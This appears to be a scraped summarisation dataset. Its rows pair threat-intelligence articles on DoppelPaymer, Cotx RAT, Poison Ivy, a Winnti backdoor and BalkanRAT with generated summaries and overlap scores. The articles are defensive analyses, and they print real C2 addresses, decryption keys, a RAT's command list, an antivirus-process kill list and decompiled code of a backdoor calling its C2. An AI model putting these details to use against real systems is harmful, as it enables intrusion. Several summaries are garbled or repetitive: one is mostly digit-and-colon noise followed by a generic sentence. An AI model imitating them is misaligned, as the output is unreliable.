0x9a4f7f43 mcafeeengineserviceTable 9. DoppelPaymer Endpoint Security Software CRC32 BlacklistCRC32 String CRC32 String 0xf26f12c8 zonealarm.exe 0xcff1c71e fortiwf.exe 0x993f5471 a2guard.exe 0x64760001 nortonsecurity.exe 0xd5345e50 a2service.exe 0x43c3c112 bullguard.exe 0xc459d010 a2start.exe 0x0d71efa0 bullguardbhvscanner.exe 0x0b02ef94 avastsvc.exe 0xa7dd5f59 bullguardscanner.exe 0x21579df3 avshadow.exe 0x77a2fba9 bullguardtray.exe 0x6b68c4c6 avastui.exe 0x50dbcbda bullguardupdate.exe 0x0108a03e fortiesnac.exe 0x6e7d6782 avira.servicehost.exe 0x830b705a fortiproxy.exe 0xb8894b22 avira.systray.exe 0xca2d58f0 fortisslvpndaemon.exe 0x40cb21d3 avp.exe 0xe2c0fe91 fortitray.exe 0xb018d47e mbcloudea.exeTable 10. DoppelPaymer Security Software CRC32 Blacklist 1CRC32 String CRC32 String 0x1a2124c0 msascuil.exe 0x895abd73 nod32.exe 0x456b109f wrsa.exe 0x2fba3706 mcshield.exeTable 11. DoppelPaymer Security Software CRC32 Blacklist 2";"CrowdStrike Intelligence has identified a new ransomware variant identifying itself as BitPaymer. This new variant was behind a series of ransomware campaigns beginning in June 2019, including attacks against the City of Edcouch, Texas and the Chilean Ministry of Agriculture. We have dubbed this new ransomware DoppelPaymer because it shares most of its code with the BitPaymer ransomware operated by INDRIK SPIDER. However, there are a number of differences between DoppelPaymer and BitPaymer, which may signify that one or more members of INDRIK SPIDER have split from the group and forked the source code of both Dridex and BitPaymer to start their own Big Game Hunting ransomware operation. INDRIK SPIDER Origins INDRIK SPIDER was formed in 2014 by former affiliates of the GameOver Zeus criminal network who internally referred to themselves as ""The Business Club."" Shortly after the group's inception, INDRIK SPIDER developed their own custom malware known as Dridex. Early versions of Dridex were primitive, but over the years the malware became increasingly professional and sophisticated. In fact, Dridex operations were significant throughout 2015 and 2016, making it one of the most prevalent eCrime malware families. At this time, INDRIK SPIDER was primarily conducting wire fraud, resulting in the loss of millions of dollars globally. Over time, INDRIK SPIDER encountered a number of obstacles to their wire fraud operations. First, in 2015 the group had to overcome a takedown operation, which resulted in the arrest of one of its affiliates,";en;{'r': 0.1320754716981132, 'p': 0.9865771812080537, 'f': 0.23296354783822376};{'r': 0.09852875613018279, 'p': 0.9866071428571429, 'f': 0.17916497605463216};{'r': 0.1320754716981132, 'p': 0.9865771812080537, 'f': 0.23296354783822376}
https://www.proofpoint.com/us/threat-insight/post/chinese-apt-operation-lagtime-it-targets-government-information-technology;Chinese APT “Operation LagTime IT” Targets Government Information Technology Agencies in Eastern Asia;"Michael Raggi and Dennis Schwarz with the Proofpoint Threat Insight TeamOverviewProofpoint researchers have identified a targeted APT campaign that utilized malicious RTF documents to deliver custom malware to unsuspecting victims. We dubbed this campaign ""Operation LagTime IT"" based on entities that were targeted and the distinctive domains registered to C&C IP infrastructure.Beginning in early 2019, these threat actors targeted a number of government agencies in East Asia overseeing government information technology, domestic affairs, foreign affairs, economic development, and political processes. We determined that the infection vector observed in this campaign was spear phishing, with emails originating from both free email accounts and compromised user accounts. Attackers relied on Microsoft Equation Editor exploit CVE-2018-0798 to deliver a custom malware that Proofpoint researchers have dubbed Cotx RAT.Additionally, this APT group utilizes Poison Ivy payloads that share overlapping command and control (C&C) infrastructure with the newly identified Cotx campaigns. Based on infrastructure overlaps, post-exploitation techniques, and historic TTPs utilized in this operation, Proofpoint analysts attribute this activity to the Chinese APT group tracked internally as TA428. Researchers believe that this activity has an operational and tactical resemblance to the Maudi Surveillance Operation which was previously reported in 2013 [1].DeliveryProofpoint researchers initially identified email campaigns with malicious RTF document attachments targeting East Asian government agencies in March 2019. These campaigns originated from adversary-operated free email sender accounts at yahoo[.]co[.].jp and yahoo[.]com. Sender addresses often imitated common names found in the languages of targeted entities. Spear phishing emails included malicious .doc attachments that were actually RTF files saved with .doc file extensions.The lures used in the subjects, attachment names, and attachment content in several cases utilized information technology themes specific to Asia such as governmental or public training documents relating to IT. On one specific occasion an email utilized the subject ""ITU Asia-Pacific Online CoE Training Course on 'Conformity & Interoperability in 5G' for the Asia-Pacific Region, 15-26 April 2019"" and the attachment name ""190315_annex 1 online_course_agenda_coei_c&i.doc"". The conference referenced in the lure was an actual event likely selected due to its relevance to potential victims. This is significant as countries in the APAC region continue to adopt Chinese 5G technology in government as well as heavy equipment industries.Figure 1: Example lure used by TA428 referencing an APAC IT conferenceWe identified several government agencies targeted as part of Operation LagTime IT. These agencies are responsible for overseeing IT, scientific research, domestic affairs, foreign affairs, political processes, and financial development.ExploitationAs we previously noted, the malicious RTF attachments exploited vulnerabilities in the Microsoft Equation Editor, specifically CVE-2018-0798, before downloading subsequent payloads. The exploit uses an encoded RTF object to drop a PE file to the Windows temporary directory. The dropped PE file has the distinctive file name ""8.t"". When executed, writes a Word Add-In file with the "".wll"" extension to the Windows Startup directory, which runs the next time Word is opened. It should be noted that this dropper methodology is not unique to TA428, and has been identified by security researchers in campaigns related to at least four additional Chinese APT groups. RTF files leveraging this technique have historically contained the string ""objw871\\objh811\\objscalex8\\objscaley8"" which has been noted by researchers at Anomali [2] and FireEye. Researchers have also recently observed this RTF weaponizer tool in commodity campaigns delivering Async RAT.After it is executed, the .wll file renames itself as RasTls.dll. Simultaneously, it decrypts a legitimate Symantec PE binary commonly named IntelGraphicsController.exe or AcroRd32.exe. This legitimate Symantec binary is used to side-load RasTls.dll using DLL search-order hijacking leading to the execution of Cotx RAT malware. Once executed the RasTls.dll file next resolves the addresses of the DLL libraries it is programmed to access and ensures that it is only running in one of five predetermined processes. These processes are winword.exe, excel.exe, powerpnt.exe, eqnedt32.exe, and acrord32.exe. The first four of these processes are associated with Microsoft Word, Excel, and PowerPoint exploits, as well as the Equation Editor exploit used by the initial malicious RTF in this campaign. The last process is utilized as part of the loading process for Cotx RAT and involves the legitimate Symantec binary noted above. The inclusion of the processes excel.exe and powerpnt.exe suggests that this stage one malware may be capable of utilizing .xls and .ppsx files as droppers. Researchers at SectorB06 [4] have noted this stage-one payload and indicated that throughout the above process it is running a ""CheckRemoteDebuggerPresent"" function to prevent analysis and debugging by researchers.Malware: Cotx RATThe RasTls.dll contains the Cotx RAT code. The malware is written in C++ using object-oriented programming. We named it by borrowing the name of the location of its stored configuration. The encrypted configuration is stored in the side-loaded DLL file RasTls.dll in a PE section named "".cotx"". The current encrypted configuration is also stored in the registry key ""HKEY_LOCAL_MACHINE\SOFTWARE\Intel\Java\user"".The configuration data is AES-192-encrypted using CBC mode and base64-encoded. We determined that the encryption key was ""98151137ab12780969b2c3612072018709a83a3352466a8b"" (hex-encoded) and the initialization vector ""IV"" was ""2042123224315117031b1a0a3ccda53f"" (hex-encoded). In plaintext the configuration appears as follows:*\x00\x00\x00217.69.8.255|||1.187.1.187|mark3|P@SSaw1||\x00\x00 The first four bytes contain the size of the configuration (42-bytes). The configuration is pipe delimited and contains:C&C host 1 C&C host 2 C&C host 3 Definition of two C&C ports An example string looks like an IP address: ""1.187.1.187"" The string is split on ""."" Port 1 is defined by (piece0 << 8) + piece1 = (1 << 8) + 187 = 443 Port 2 is defined by (piece2 << 8) + piece3 = (1 << 8) + 187 = 443 Alternatively, if the string is not an IP address, but looks like a host, it will resolve the host into an IP address and calculate the ports using the resolved address ""mark"" field - sent in the C&C beacon ""passwd"" field - sent in the C&C beacon Proxy IP and port Discovered by searching the IPv4 TCP connection table for established connections with remote ports using common proxy ports (3128, 8080, 808, 1080) Or via WINHTTP_OPTION_PROXYFor persistence, Cotx stores files in a directory ""Intel\Intel(R) Processor Graphics"". The location of this folder varies among samples with both the %AppData% and %PROGRAMFILES% directories being observed.The command and control structure of Cotx RAT is proxy aware. It utilizes wolfSSL for TLS encrypted communication. The initial beacon contains ""|""-delimited system information. The data included in the beacon is Zlib compressed and encrypted with AES-192 in CBC mode utilizing the same keys as the configuration. The following values are included:""id"" value from ""software\\intel\\java"" subkeyComputer name""mark"" field from configurationUsernameWindows versionArchitecturePossible malware version. ""0.9.7"" is hardcoded in the analyzed sampleLocal IP addressesFirst adapter's MAC addressConnection type (https or _proxy)""password"" field from configurationCommands from the C&C are received from the malware beacon. This data is AES-encrypted. We observed the following commands:0 - Keep alive, sets a ""poll again"" flag and sends an empty response to C&C1 - Sets ""id"" value in ""software\\intel\\java"" subkey, sends an empty response to C&C2 - Get directory info or drive info5 - Open command shell6 - Open command shell as logged in user7 - Send command to command shell8 - Copy file9 - Delete file10 - Read file11 - Check for filename. If doesn't exist, check for filename with "".ut"" extension. If it exists, send file size back to C&C12 - Write file13 - Screenshot14 - Process listing15 - Kill process16 - Send current configuration to C&C17 - Update config in registry and "".cotx"" PE section18 - Set sleep time19 - Close C&C comms20 - Uninstall and remove self21 - Get list of installed software22 - Kill command shell23 - Exit malware24 - Send a ""Ctrl-C"" to the command shell and exit25 - Execute an executableMalware: Poison IvyTA428 threat actors also delivered Poison Ivy malware payloads. In a limited number of cases, we observed attachments utilizing the 8.t dropper methodology described above. However, the majority of Poison Ivy payloads were dropped as PE files named OSE.exe when the RTF attachment was executed and an Equation Editor vulnerability was successfully exploited. The Poison Ivy samples all communicated with the IP 95.179.131[.]29. We identified earlier variants of Poison Ivy malware that utilized the above IP via open source research, which used the file names bubbles.exe and sfx.exe. Examination of the Poison Ivy malware configurations indicated that all samples shared the password ""3&U<9f*lZ>!MIQ"" while campaign and group IDs, as well as mutexes varied across campaigns.We identified significant operational overlap between Cotx RAT campaigns and Poison Ivy campaigns. Specifically, on several occasions users that were unsuccessfully targeted with Cotx RAT malware were later targeted with messages distributing Poison Ivy. Users were also targeted by Poison Ivy malware on successive occasions indicating the adversary's persistent nature in attempting to compromise targets via spear phishing. In one example, a targeted user received an unsuccessful phishing email attempting to deliver Cotx RAT followed by a Poison Ivy phishing email seven days later. In addition to a shared targeting list, analysts observed adversary reuse of free email sender accounts to deliver both Cotx RAT and Poison Ivy malware to different users. It appears the adversary sender accounts utilized delivery TTPs and payloads interchangeably from March through April 2019. This vacillation of tactics further enforces Proofpoint's classification of these campaigns under a single operation.C&C InfrastructureAn examination of the separate C&C infrastructure utilized by Cotx RAT and Poison Ivy payloads revealed further overlaps between these campaigns. A review of passive DNS information indicated that the C&C IPs hosted subdomains that share the root domain vzglagtime[.]net. We found that the Poison Ivy C&C IP hosted the domains f1news[.]vzglagtime[.]net and news[.]vzglagtime[.]net. The Cotx RAT C&C IP hosted the hostname mtanews.vzglagtime[.]net. The latter of these domains was previously reported by security researchers to have been a C&C address observed in a malware implant targeting the East Asian Telecommunications and Transportation sectors in January 2019. The presence of related domain registrations on disparate malware IP infrastructure also contributed to analysts' decision to classify these campaigns collectively under Operation LagTime IT.Poison Ivy Cotx RAT C&C IP 95.179.131[.]29 217.69.8[.]255 Domains Hosted by IP f1news.vzglagtime[.]net news.vzglagtime[.]net mtanews.vzglagtime[.]netConclusionProofpoint analysts assess that Operation LagTime IT is likely a continuation of targeted activity by APT actors aligned with Chinese state interests. This operation, centered around East Asian governmental agencies, may represent efforts to satisfy espionage and intelligence requirements relative to China's regional neighbors. While not revolutionary in its approach or malware design, TA428 actors demonstrated significant persistence in compromising victims and utilized custom malware. The defined scope of targeting in this operation including government information technology agencies demonstrates a focus on high-value targets. While ultimately the motivation for this APT campaign remains opaque, what is certain is that TA428 persists in targeting users responsible for the orchestration of governmental systems in East Asia.References[1] https://paper.seebug.org/papers/APT/APT_CyberCriminal_Campagin/2012/NormanShark-MaudiOperation.pdf[2] https://www.anomali.com/blog/analyzing-digital-quartermasters-in-asia-do-chinese-and-indian-apts-have-a-shared-supply-chain[3] https://speakerdeck.com/ashley920/into-the-fog-the-return-of-icefog-apt[4] https://threatrecon.nshc.net/2019/04/30/sectorb06-using-mongolian-language-in-lure-document/Indicators of Compromise (IOCs)IOC IOC Type Description 304115cef6cc7b81f4409178cd0bcea2b22fd68ca18dfd5432c623cbbb507154 SHA256 Cotx RAT d0ccb9a277b986f7127199f122023c79a7e0253378a4a78806fbf55a87633532 SHA256 Cotx RAT 81898df69e28a084ea37b77b568ccde34afdf96122ab784f8a361f055281ed0f SHA256 Cotx RAT 93ac0ff3f01f8b8dfad069944d917e4b0798d42bc9ff97028e5a4ea8bda54dbc SHA256 Cotx RAT 3dbff4e82dd8ddf71f9228f68df702b8f4add47237f2aee76bd5537489ed2fa9 SHA256 Cotx RAT cbf607725d128d93fed3b58cde78e1feb7db028a1ed1aa5c924e44faa1015913 SHA256 Poison Ivy 9a477b455a20a26875e5ff804151f9f6524131c32edf04366cfbaf9d41c83f2a SHA256 Poison Ivy eb0191d1b8e311d2716795e9fa7c0300c5199ebf3d8debff77993f23397d2fb5 SHA256 Poison Ivy 1bc93ef96134be9a5a7b5f5b747be796a9ff95bdc835d72541673565d1c165b8 SHA256 Poison Ivy 4c22eb33aa1d10511eaf8d13098e2687e44eaebc5af8112473e28acedac34bea SHA256 Poison Ivy 93f56ec68e072ccba8102c71d005604763d064021795c7c8bb1cade05ddb6ff6 SHA256 Poison Ivy e9fa0a6223b0e4e60654dc629cd46174b064d5a0968732e6f05bc212a2cdf3f4 SHA256 Poison Ivy b7cfea87d7de935e1f20e3c09ba4bd1154580682e75330876f21f241b33946f2 SHA256 8.t Dropper ae3e335cc39c07bda70e26e89003e0d1b8eea2deda2b62a006517c959fc0a27a SHA256 8.t Dropper 1d492e549d2cbd296bc8e1368c8625df0c82c467c1b4addea7191e4a80bf074e SHA256 8.t Dropper b541e0e29c34800a067b060d9ee18d8d35c75f056f4246b1ce9561a5441d5a0f SHA256 8.t Dropper 95.179.131[.]29 C2 IP Poison Ivy C2 217.69.8[.]255 C2 IP Cotx RAT C2 f1news.vzglagtime[.]net Domain Domain Related by IP news.vzglagtime[.]net Domain Domain Related by IP mtanews.vzglagtime[.]net Domain Domain Related by IPET and ETPRO Suricata/Snort Signatures2836210 ETPRO TROJAN SSL/TLS Certificate Observed (SectorB06 Dropper)";"Michael Raggi and Dennis Schwarz with the Proofpoint Threat Insight TeamOverviewProofpoint researchers have identified a targeted APT campaign that utilized malicious RTF documents to deliver custom malware to unsuspecting victims. We dubbed this campaign ""Operation LagTime IT"" based on entities that were targeted and the distinctive domains registered to C&C IP infrastructure.Beginning in early 2019, these threat actors targeted a number of government agencies in East Asia overseeing government information technology, domestic affairs, foreign affairs, economic development, and political processes. We determined that the infection vector observed in this campaign was spear phishing, with emails originating from both free email accounts and compromised user accounts. Attackers relied on Microsoft Equation Editor exploit CVE20180798 to deliver a custom malware that Proofpoint researchers have dubbed Cotx RAT.Additionally, this APT group utilizes Poison Ivy payloads that share overlapping command and control (C&C) infrastructure with the newly identified Cotx campaigns. Based on infrastructure overlaps, postexploitation techniques, and historic TTPs utilized in this operation, Proofpoint analysts attribute this activity to the Chinese APT group tracked internally as TA428. Researchers believe that this activity has an operational and tactical resemblance to the Maudi Surveillance Operation which was previously reported in 2013 [1].DeliveryProofpoint researchers initially identified email campaigns with malicious RTF document attachments targeting East Asian government agencies in March 2019. These campaigns originated from adversaryoperated free email sender accounts at yahoo[.]co[. ].jp and yahoo[.]com. Sender addresses often Cotx RAT is a stageone malware that is written in C++ using objectoriented programming. It is proxy aware and utilizes wolfSSL for TLS encrypted communication. The initial beacon contains ""|""delimited system information. The data included in the beacon is Zlib compressed and encrypted with AES192 in CBC mode utilizing the same keys as the configuration. The following values are included:""id"" value from ""software\\intel\\java"" subkeyComputer name""mark"" field from configurationUsernameWindows versionArchitecturePossible malware version. The following values are included:""id"" value from ""software\\intel\\java"" subkeyComputer name""mark"" field from configurationUsernameWindows versionArchitecturePossible malware version. ""0.9.7"" is hardcoded in the analyzed sampleLocal IP addressesFirst adapter's MAC addressConnection type (https or _proxy)""password"" field from configurationCommands from the C&C are received from the malware beacon. This data is AESencrypted. We observed the following commands:0 Keep alive, sets a ""poll again"" flag and sends an empty response to C&C1 Sets ""id"" value in ""software\\intel\\java"" subkey, sends an empty response to C&C2 Get directory info or drive info5 Open command shell as logged in user7 Send command to command shell and exit20 Execute an executableMalware: Poison IvyTA428 threat actors also delivered Poison Ivy malware payloads. In a limited number of cases, we observed attachments utilizing the 8.t dropper methodology described above. However, the majority of Poison Ivy payloads were dropped as PE files named OSE.exe when the RTF attachment was executed and an Equation Editor vulnerability was successfully exploited. The Poison Ivy samples all communicated with the IP 95.179.131[.]29. We identified earlier variants of Poison Ivy malware that utilized the above IP via open source research, which used the file names bubbles.exe and sfx.exe. Examination of the Poison Ivy malware configurations indicated that all samples shared the password ""3&U<9f*lZ>!MIQ"" while campaign and group IDs, as well as mutexes varied across campaigns.We identified SectorB06 Dropper ### Output: SectorB06 Dropper";en;{'r': 0.3574007220216607, 'p': 0.9642857142857143, 'f': 0.5215100926301509};{'r': 0.26865671641791045, 'p': 0.9259259259259259, 'f': 0.41647385121054514};{'r': 0.3574007220216607, 'p': 0.9642857142857143, 'f': 0.5215100926301509}
https://sebdraven.medium.com/winnti-uses-the-rtf-exploit-8-t-too-targets-vietnam-13300d432272;Winnti uses the rtf exploit 8.t too targeting Vietnam;"Winnti uses the rtf exploit 8.t too targeting VietnamThe stages of installation of the backoor Sebdraven * Follow * Jul 23, 2019 6 min read -- Listen ShareIn may 2019, I found a rtf 152f95a5bdf549c5ca789d0dd99d635ee69cca6fe464ced5b39d0316707a4914 using the same technics to drop 8.t on disk exploiting the cve-2017_11882, decodes many files:C:\Users\admin\AppData\Local\Temp\LBTServ.dll a8c21cb9dea1c9bc62adcc6de4a73c7971ea797ab4fdb93320532647625e22baC:\Users\admin\AppData\Local\Temp\unio.exe 7aadcb53ca413648eba86d01490038d4c0763bceb5875abceb10da12d4d6a2ddAnd a file very interesting:C:\Users\admin\AppData\Local\Temp\k1.inithis file content is:[SYSTEM] Config=Z29vZzFldXBkYXRlLmNvbTo4MHx3d3cuZ29vZzFldXBkYXRlLmNvbTo4MHw6ODB8PassWord=123456Group=Default GroupRemark=20180415Version=1.0UID=21093024This file is generated by the second EQNEDT32.exe after rewriting completly by the shellcode in memory and the UID change everyday.The exe after dumping (3c027b14431e01c548326e68d5ab6c559867bbb62bb4651ad85c4867f26d8e64) the the files in %TEMP% is made in the function FUN_00401040. (Function Called after the entry point)In the first step, the path of the files are created:GetTempPathW(0x104,&local_924),lstrcpyW(&local_618,&local_924),lstrcpyW(&local_410,&local_924),lstrcpyW(&local_208,&local_924),lstrcatW(&local_924,u_LBTServ.d_00409118), // LBTServ.dlllstrcatW(&local_924,(LPCWSTR)&DAT_00409110),lstrcatW(&local_618,u_mkrt.nww_004090fc),lstrcatW(&local_410,u_wbnsd.pr_004090e8),lstrcatW(&local_208,u_unio.e_00409134), // unio.exelstrcatW(&local_208,(LPCWSTR)&DAT_0040912c),FUN_00401a80(0x6c,u_TYPELIB_004090d8), FUN_00401890(&local_618,&local_924), //install LBTServ.dllIn the function void __cdecl FUN_00401890(LPCWSTR param_1,LPCWSTR param_2)we have: hFile = CreateFileW(param_1,0x80000000,0,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0),and here the content of the file is written in the same function:if (hObject != (HANDLE)0xffffffff) {hModule = LoadLibraryW(u_Kernel32.dll_004090bc),local_a = 0x69,ilocal_6 = 0x69,ilocal_c = 'W',local_b = 0x72, //rlocal_9 = 0x74,//tlocal_8 = 0x65,//elocal_7 = 0x46,Flocal_5 = 0x6c,llocal_4 = 0x65,elocal_3 = 0,pFVar2 = GetProcAddress(hModule,&local_c),(*pFVar2)(hObject,puVar1,(int)uVar7,Pm_1,0),CloseHandle(hObject),FreeLibrary(hModule),}CloseHandle(hFile),In the stack, &local_c =""WriteFile""The file wbnsd.pr compressing with ApLib is created in %TEMP%.And the function FUN_0040189 now, the file wbnsd.pr is read and decompressed in the function FUN_00401eb4, union.exe is located in 306AA8 and is written in the disk.In finaly, it's the k1.ini file created in the %TEMP%.GetTempPathW(0x104,&WStack2864),lstrcatW(&WStack2864,u_k1.ini_004090ac),And the different sections of the ini file are written using WritePrivateProfileStringGhidra pseudo CodeIn debugFinaly, unio.exe is executed.After the execution a .bat has created and executed:the .bat deletes the EQNEDT32.EXE and itself.del C:\Program Files\Common Files\microsoft shared\EQUATION\EQNEDT32.EXEdel %0The loading of the backdoor and the network protocolsThe backdoor LBTServ.dll is side loading by union.exe in the function FUN_00401000_strcpy(local_134,""LBTServ.dll""),local_c = LoadLibraryA(local_134),A mutex is too created:local_10 = CreateMutexA((LPSECURITY_ATTRIBUTES)0x0,0,""LBTWizRunningMutex""),The malicious code of the backoor is in the export LGBT_Launch.This function is called after an GetProcAddress.pFVar3 = GetProcAddress(local_c,""LGBT_Launch""),pvVar5 = (HANDLE)(*pFVar3)(local_14),The function LGBT_Launch of the backdoor is:void __fastcall LGBT_Launch(DWORD param_1){HANDLE hHandle,DWORD local_4,/* 0xc6f0 4 LGBT_Launch */local_4 = param_1,do {hHandle = CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,(LPTHREAD_START_ROUTINE)&LAB_1000c260,(LPVOID)0x0,0,&local_4),WaitForSingleObject(hHandle,0xffffffff),CloseHandle(hHandle),Sleep(10000),} while( true ),}A thread has created with the code on 1000c260.the function 1000c260 is the function of initialization of the backoor.the k1.ini file is readed to load the configuration using by the backdoor.GetTempPathW(0x104,(LPWSTR)&uStack4),lstrcatW((LPWSTR)&uStack4,u_k1.i_1001b908),lstrcatW((LPWSTR)&uStack4,(LPCWSTR)&DAT_1001b900),GetPrivateProfileStringW(u_SYSTEM_1001b8e0,u_Config_1001b914,(LPCWSTR)0x0,(LPWSTR)&stack0x000016bc,0x800,(LPCWSTR)&uStack4),the first string is Z29vZzFldXBkYXRlLmNvbTo4MHx3d3cuZ29vZzFldXBkYXRlLmNvbTo4MHw6ODB8and this string is a base64 encoding the c2. and this the function FUN_1000b730((int)&stack0x000016bc,uVar1,(int)puVar5,(int *)ppuVar6),decoded the string.The requests of this backdoor are very specificly.hxx://goog1eupdate.com/21093024/000003B800000EA8/2019/5/6/9/14/1/000E6DC900000029the function which created this request is FUN_100053f0if (param_2 == 1) {uVar2 = deobf_hostname(),DVar3 = GetTickCount(),uVar8 = (uint)local_10.wSecond,uVar13 = (uint)local_10.wMinute,uVar12 = (uint)local_10.wHour,uVar7 = (uint)local_10.wMonth,uVar11 = (uint)local_10.wDay,uVar10 = (uint)local_10.wYear,DVar4 = GetCurrentThreadId(),DVar5 = GetCurrentProcessId(),iVar6 = sprintf(_Dest,""%s %s%s/%s/%08X%08X/%u/%u/%u/%u/%u/%u/%08X%08x HTTP/1.0\rHost:%s\rUser-Agent: Mozilla/4.0 (compatible, MSIE 6.0, Windows NT 5.1,SV1)\rAccept: */*\rProxy-Connection: Keep-Alive\rPragma:no-cache\r\r"",&DAT_1001b518,&DAT_1002d00c,&DAT_1002d00c,param_4,DVar5,DVar4,uVar10,uVar7,uVar11,uVar12,uVar13,uVar8,DVar3,uVar2,param_3),FUN_10002160(param_1,iVar6),return iVar6,}We found the UID 21093024. And this UID changes every day.The processID and the ThreadID are used to create the backoor.this DAT_1001b518 is the method of HTTPThe backdoor is a state machine defined by the function FUN_10006b10Threat IntelligenceFocus on the documentThe document is a decoy written in Vietnamese and speak about a exchange of student for the Unversity of Kazan.The rtf document is already know for being used by the chinese threats actor.On Vietnam, Goblin Panda is very active, a bit Icefog.But the new is the backdoor is linked at Winnti group.The domain used for the C2 goog1eupdate.com is not recorded an known group.The protocol HTTPs is a strong TTP so it's possible to make yara for the piece of code.rule backdoor_gob{meta:generated_by = ""Sebdraven""sample = ""a8c21cb9dea1c9bc62adcc6de4a73c7971ea797ab4fdb93320532647625e22ba""/*0x549a 56 push esi0x549b E830020000 call 0x56d00x54a0 50 push eax0x54a1 FF1598600110 call dword ptr [0x10016098]0x54a7 8B4C2424 mov ecx, dword ptr [esp + 0x24]0x54ab 8B542422 mov edx, dword ptr [esp + 0x22]0x54af 50 push eax0x54b0 8B442424 mov eax, dword ptr [esp + 0x24]0x54b4 81E1FFFF0000 and ecx, 0xffff0x54ba 81E2FFFF0000 and edx, 0xffff0x54c0 51 push ecx0x54c1 8B4C2426 mov ecx, dword ptr [esp + 0x26]0x54c5 25FFFF0000 and eax, 0xffff0x54ca 52 push edx0x54cb 8B542426 mov edx, dword ptr [esp + 0x26]0x54cf 50 push eax0x54d0 8B442428 mov eax, dword ptr [esp + 0x28]0x54d4 81E1FFFF0000 and ecx, 0xffff0x54da 81E2FFFF0000 and edx, 0xffff0x54e0 51 push ecx0x54e1 25FFFF0000 and eax, 0xffff0x54e6 52 push edx0x54e7 50 push eax0x54e8 FF1500610110 call dword ptr [0x10016100]0x54ee 50 push eax0x54ef FF1594600110 call dword ptr [0x10016094]0x54f5 50 push eax0x54f6 53 push ebx0x54f7 56 push esi0x54f8 6858B50110 push 0x1001b5580x54fd 6818B50110 push 0x1001b5180x5502 68C0740110 push 0x100174c00x5507 57 push edi0x5508 FF1554610110 call dword ptr [0x10016154]0x550e 8B4C2468 mov ecx, dword ptr [esp + 0x68]0x5512 83C444 add esp, 0x440x5515 8BF0 mov esi, eax0x5517 56 push esi0x5518 E843CCFFFF call 0x21600x551d 8BC6 mov eax, esi0x551f 5F pop edi0x5520 5E pop esi0x5521 5D pop ebp0x5522 5B pop ebx0x5523 83C410 add esp, 0x10*/strings:$chunk_1 = {56E8 ?? ?? ?? ??50FF 15 ?? ?? ?? ??8B 4C 24 ??8B 54 24 ??508B 44 24 ??81 E1 FF FF 00 0081 E2 FF FF 00 00518B 4C 24 ??25 FF FF 00 00528B 54 24 ??508B 44 24 ??81 E1 FF FF 00 0081 E2 FF FF 00 005125 FF FF 00 005250FF 15 ?? ?? ?? ??50FF 15 ?? ?? ?? ??50535668 ?? ?? ?? ??68 ?? ?? ?? ??68 ?? ?? ?? ??57FF 15 ?? ?? ?? ??8B 4C 24 ??83 C4 448B F056E8 ?? ?? ?? ??8B C65F5E5D5B83 C4 10}condition:any of them}After a retrohunt I found another backdoors399563e798edd4a9e1a89209b1b350a4e1197786c23c0986a1a965446e7d5474 7206dbf8c80d220125234748725a911d766674292e437cb5599a619c77db55515d4f46c4751573a3cbc63a6abed42068bf62416811b13bd7b6b7762151bd184d fd539d345821d9ac9b885811b1f642aa1817ba8501d47bc1de575f5bef2fbf9eAll are very similar with the backdoor.IOCs152f95a5bdf549c5ca789d0dd99d635ee69cca6fe464ced5b39d0316707a4914sha256 152f95a5bdf549c5ca789d0dd99d635ee69cca6fe464ced5b39d0316707a4914sha1 17f0307a371aec346fe004f0ba599708453421cdmd5 9c13823a0ed273b292fd83ac56bea9b0Dropped executable filesha256 C:\Users\admin\AppData\Local\Temp\LBTServ.dll a8c21cb9dea1c9bc62adcc6de4a73c7971ea797ab4fdb93320532647625e22basha256 C:\Users\admin\AppData\Local\Temp\unio.exe 7aadcb53ca413648eba86d01490038d4c0763bceb5875abceb10da12d4d6a2ddDNS requestsdomain goog1eupdate.comdomain www.goog1eupdate.comConnectionsip 58.64.184.209";_1_0_10_0_1 1. . . . . [1 1 1 1 1 1 . . . 1 1 1 1 10001 1 1 0 1 1 : : ::::::::::::::::1: :0_c_0_1_1_1_1_1_10_1000 0 00 . . . . 0 1 1 1 1 . . . . 0 0 [00000000_:):::::::: : :: : : : : : _2_2_2_2 : : : : : : 1::1:1:1:1:1:1:1000_0_0_0_00000000020202000000000000000000000000000000000000000011212.2.2.2.2...:.:.::1:11111.11000000000000000(10000000222220000000000000000000000000000000000000000000:::::: The ITSecurity report indicates that the system is vulnerable to malicious attacks. The report recommends that the system should be updated with the latest security patches and should be monitored regularly. The ITSecurity report found several backdoors, IOCs, dropped executable files, DNS requests, and connections.;en;{'r': 0.022916666666666665, 'p': 0.22, 'f': 0.041509432253471056};{'r': 0.001314060446780552, 'p': 0.013888888888888888, 'f': 0.002400958804881935};{'r': 0.020833333333333332, 'p': 0.2, 'f': 0.037735847347810686}
https://www.welivesecurity.com/2019/08/14/balkans-businesses-double-barreled-weapon/;In the Balkans, businesses are under fire from a double?barreled weapon;"ESET researchers discovered a campaign that uses two malicious tools with similar capabilities to ensure both resilience and broader potential for the attackersWe've discovered an ongoing campaign in the Balkans spreading two tools having a similar purpose: a backdoor and a remote access trojan we named, respectively, BalkanDoor and BalkanRAT.BalkanRAT enables the attacker to control the compromised computer remotely via a graphical interface, i.e., manually, BalkanDoor enables them to control the compromised computer remotely via a command line, i.e., possibly en masse. ESET security products detect these threats as Win{32,64}/BalkanRAT and Win32/BalkanDoor.A typical victim of this campaign, which uses malicious emails as its spreading mechanism, ends up having both these tools deployed on the computer, each of them capable of fully controlling the affected machine. This rather uncommon setup makes it possible for attackers to choose the most suitable method to instruct the computer to perform operations of their choice.The campaign's overarching theme is taxes. With the contents of the emails, included links and decoy PDFs all involving taxes, the attackers are apparently targeting the financial departments of organizations in the Balkans region. Thus, although backdoors and other tools for remote access are often used for espionage, we believe that this particular campaign is financially motivated.The campaign has been active at least from January 2016 to the time of writing (the most recent detections in our telemetry are from July 2019). Some parts of the campaign were briefly described by a Serbian security provider in 2016 and the Croatian CERT in 2017. Each of these sources focused only on one of the two tools and only on a single country. However, our research shows that there is a significant overlap in targets and also in the attackers' tactics, techniques and procedures.Our findings show that the mentioned attacks have been orchestrated and we consider them a single long-term campaign that spans Croatia, Serbia, Montenegro, and Bosnia and Herzegovina.Our research has also shed more light at the malware used in this campaign and provided some context. We've discovered a new version of BalkanDoor with a new method for execution/installation: an exploit of the WinRAR ACE vulnerability (CVE-2018-20250). Furthermore, we've seen both malicious tools digitally signed with various certificates the developers paid for to add perceived legitimacy. One of them, issued to SLOW BEER LTD, was even valid at the time of writing, we've notified the issuer about the misuse and they revoked the certificate.In this article, we will describe some notable features of both BalkanDoor and BalkanRAT. 